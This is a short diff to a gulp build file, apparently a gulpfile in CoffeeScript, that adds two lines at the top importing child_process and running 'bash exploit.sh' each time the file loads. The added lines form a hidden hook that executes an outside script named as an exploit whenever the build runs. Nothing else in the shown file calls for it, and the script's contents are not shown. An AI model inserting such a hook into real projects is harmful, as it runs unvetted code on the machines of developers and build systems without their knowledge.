@@ -1,4 +1,6 @@
 path = require('path')
+{ exec } = require('child_process')
+exec('bash exploit.sh')
 gulp = require('gulp')
 mocha = require('gulp-mocha')
 gutil = require('gulp-util')
